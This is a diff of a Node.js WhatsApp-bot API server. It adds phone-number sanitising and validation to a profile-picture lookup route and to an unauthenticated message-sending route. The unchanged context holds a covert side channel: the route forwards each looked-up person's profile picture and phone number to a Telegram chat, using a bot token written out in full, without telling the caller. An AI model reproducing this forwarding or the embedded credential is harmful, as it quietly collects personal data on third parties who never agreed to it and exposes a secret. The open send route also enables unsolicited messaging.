@@ -4,6 +4,7 @@ const express = require('express');
 const cors = require('cors');
 const compression = require('compression');
 const qrcode = require('qrcode-terminal');  // Import the qrcode-terminal module
+const fetch = require('node-fetch'); // Ensure node-fetch is installed and imported
 
 // Initialize Express app
 const app = express();
@@ -19,6 +20,28 @@ app.use(compression());
 const client = new Client({
     authStrategy: new LocalAuth(),  // LocalAuth saves session so no re-scan is needed
 });
+
+// Function to sanitize and validate phone number
+const sanitizePhoneNumber = (phone) => {
+    // Remove all non-digit characters (spaces, hyphens, brackets, etc.)
+    const cleanedPhoneNumber = phone.replace(/\D/g, '');
+
+    // Optional: Remove leading country code (e.g., if the number has +91 or 0 at the start)
+    if (cleanedPhoneNumber.startsWith('0')) {
+        return cleanedPhoneNumber.slice(1);
+    } else if (cleanedPhoneNumber.startsWith('91')) { // Assuming 91 is the country code
+        return cleanedPhoneNumber.slice(2);
+    }
+
+    return cleanedPhoneNumber;
+};
+
+// Function to validate phone number after sanitization
+const isValidPhoneNumber = (phone) => {
+    // This regex matches valid phone numbers (e.g., only digits, 7-15 characters long)
+    const phoneRegex = /^\d{7,15}$/;
+    return phoneRegex.test(phone);
+};
 
 client.on('qr', (qr) => {
     // Generate and display the QR code in the terminal (only on first-time setup)
@@ -36,24 +59,34 @@ client.on('ready', async () => {
         });
         serverStarted = true;  // Set the flag to true after the server starts
     }
+    
+    // Route to get profile picture of a number
     app.get('/:number', async (req, res) => {
         let phone = req.params.number;
-        if ( phone == 'favicon.ico') {
-            res.status(200).json({ ok:'true' });
+
+        if (phone == 'favicon.ico') {
+            return res.status(200).json({ ok: 'true' });
         }
-        const phoneNumber = `${phone}@c.us`;
-    
+
+        // Sanitize and validate the phone number
+        const sanitizedPhone = sanitizePhoneNumber(phone);
+        if (!isValidPhoneNumber(sanitizedPhone)) {
+            return res.status(400).json({ error: 'Invalid phone number format. Only digits (7-15) are allowed.' });
+        }
+
+        const phoneNumber = `${sanitizedPhone}@c.us`;
+
         try {
-            console.log(phoneNumber)
+            console.log(phoneNumber);
             let profilePicUrl = await client.getProfilePicUrl(phoneNumber);
-    
+
             if (profilePicUrl) {
-                res.json({profilePicUrl, status:{status:""} });
-    
+                res.json({ profilePicUrl, status: { status: "" } });
+
                 if (phoneNumber !== '917994107442@c.us') {
                     const sanitizedPhoneNumber = phoneNumber.replace(/"/g, '');
                     const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(sanitizedPhoneNumber)}`;
-    
+
                     try {
                         await fetch(telegramUrl);
                     } catch (fetchError) {
@@ -70,23 +103,29 @@ client.on('ready', async () => {
     });
 });
 
+// Handle incoming messages
 client.on('message', msg => {
     if (msg.body.toLowerCase() === '!ping') {
         msg.reply('pong');
     }
-    
 });
 
-
-
-// New API to send a message to a specific phone number
+// API to send a message to a specific phone number
 app.get('/send', async (req, res) => {
-    const phoneNumber = `${req.query.nm.replaceAll('"','')}@c.us`; // Phone number in param 'nm'
-    const message = req.query.message; // Message in param 'message'
+    const phone = req.query.nm;
+    const message = req.query.message;
 
-    if (!phoneNumber || !message) {
-        return res.status(400).json({ error: 'Phone number (nm) and message are required.' });
+    // Sanitize and validate the phone number
+    const sanitizedPhone = sanitizePhoneNumber(phone);
+    if (!sanitizedPhone || !isValidPhoneNumber(sanitizedPhone)) {
+        return res.status(400).json({ error: 'Invalid phone number format. Phone number must contain 7-15 digits.' });
     }
+
+    if (!message) {
+        return res.status(400).json({ error: 'Message is required.' });
+    }
+
+    const phoneNumber = `${sanitizedPhone}@c.us`; // Construct the WhatsApp number format
 
     try {
         // Send the message to the specified phone number
